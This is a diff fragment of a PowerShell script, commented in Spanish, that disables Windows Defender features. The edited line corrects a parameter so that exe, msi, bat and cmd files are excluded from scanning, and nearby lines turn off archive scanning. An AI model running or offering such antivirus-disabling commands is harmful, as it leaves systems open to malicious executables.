@@ -26,7 +26,7 @@ Set-MpPreference -DisableArchiveScanning $true
 
 # Desactivar la detección de archivos descargados
 Set-MpPreference -DisableAutoExclusions $true
-Set-MpPreference -ExcludeExtension "exe", "msi", "bat", "cmd"
+Set-MpPreference -ExclusionExtension "exe", "msi", "bat", "cmd"
 
 Write-Host "Windows Defender debería estar desactivado." -ForegroundColor Green
 
